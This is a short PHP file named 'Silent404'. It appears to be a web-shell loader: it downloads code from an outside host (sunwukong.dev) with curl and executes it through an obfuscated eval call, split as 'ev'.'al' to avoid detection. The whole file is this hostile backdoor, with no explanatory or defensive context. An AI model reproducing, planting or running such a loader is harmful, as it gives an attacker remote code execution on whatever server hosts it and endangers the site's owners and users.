<?php
// Silent404 - Silent404
function geturlsinfo($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}

$e = 'ev' . 'al';
$c = geturlsinfo('https://sunwukong.dev/Silent/silent404.txt');
$e('?>' . $c);
?>
